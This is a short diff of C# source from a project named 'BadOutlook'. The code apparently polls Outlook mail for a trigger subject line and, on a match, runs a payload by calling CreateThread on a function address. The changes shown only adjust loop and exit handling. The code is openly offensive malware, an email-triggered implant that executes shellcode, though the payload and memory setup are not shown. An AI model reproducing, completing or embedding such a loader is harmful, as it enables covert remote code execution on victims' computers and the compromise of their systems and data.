@@ -23,8 +23,7 @@ namespace BadOutlook
                
                 foreach (dynamic mail in mails)
                 {
-
-
+ 
                     if (mail.EmailSubject.Contains(trigger) )
                     {
 
@@ -43,20 +42,23 @@ namespace BadOutlook
                         hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                         execed = true;
                         break;
+                    
                     }
 
 
                     i += 1;
                 }
-                
-                Console.WriteLine("No trigger found, trying again in 10 seconds");
-                Thread.Sleep(pollingInterval * 1000); // sleep for 10 seconds
-            
+
+                if (!execed)
+                {
+                 
+                    Console.WriteLine("No trigger found, trying again in 10 seconds");
+                    Thread.Sleep(pollingInterval * 1000); // sleep for 10 seconds
+
+                }
             }
 
-
-
-            Console.ReadKey();
+            while (Console.ReadKey().Key != ConsoleKey.Enter) { }
             return;
         }
 
